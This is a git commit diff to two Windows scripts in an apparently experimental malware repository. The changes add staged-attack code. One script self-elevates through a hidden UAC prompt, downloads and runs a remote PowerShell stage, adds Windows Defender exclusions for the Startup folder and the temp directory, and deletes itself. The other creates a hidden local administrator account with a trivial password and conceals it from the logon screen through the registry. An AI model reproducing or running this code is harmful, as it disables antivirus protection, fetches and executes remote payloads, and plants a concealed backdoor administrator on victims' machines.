faaedd9f7d4cc8973e07b59949524d30e1c099c0
DomoKrch <kyndomo9@gmail.com>
2024-03-06 00:31:55 +0600

    Minor tricks for local admin acc

--- sec_stage.cmd
+++ sec_stage.cmd
@@ -4,7 +4,8 @@ REM Script for self-elevation
 net file 1>NUL 2>NUL || start "" mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c pushd ""%~dp0"" && ""%~s0"" %*","","runas",0)(window.close) && exit
 
 powershell -windowstyle hidden -c "Invoke-WebRequest 'raw.githubusercontent.com/DomoKrch/exper_shit/main/third_stage.ps1' -OutFile './third_stage.ps1'"
-REM Add third stage to exclusion path for insurance
-powershell -windowstyle hidden -c "Add-MpPreference -ExclusionPath 'C:\Users\me\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\third_stage.ps1'; .\third_stage.ps1"
+REM Add third stage and temp dir to exclusion paths for insurance
+powershell -windowstyle hidden -c "Add-MpPreference -ExclusionPath 'C:\Users\me\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\third_stage.ps1'"
+powershell -windowstyle hidden -c "Add-MpPreference -ExclusionPath '$env:Temp'; .\third_stage.ps1"
 
 DEL %0
--- third_stage.ps1
+++ third_stage.ps1
@@ -1,6 +1,18 @@
-#REM randomly generated chars
+# Randomly generated chars for temp dir and dir's for vbs and reg scripts
 $temp_dir = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
+$reg_dir = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
+$vbs_dir = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
+
+$user = "test"
+$p = ConvertTo-SecureString "test" -AsPlainText -Force
+
+# Local user for "something" and "then excluding them from log page"
+New-LocalUser $user -Password $p -FullName "test" -Description "test"
+Add-LocalGroupMember -Group "Administrators" -Member $user
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v $user
+
 
 mkdir $env:Temp/$temp_dir
 echo "hi" > $env:Temp/$temp_dir/hi.txt
-Remove-Item $PSCommandPath -Force 
+
+Remove-Item $PSCommandPath -Force
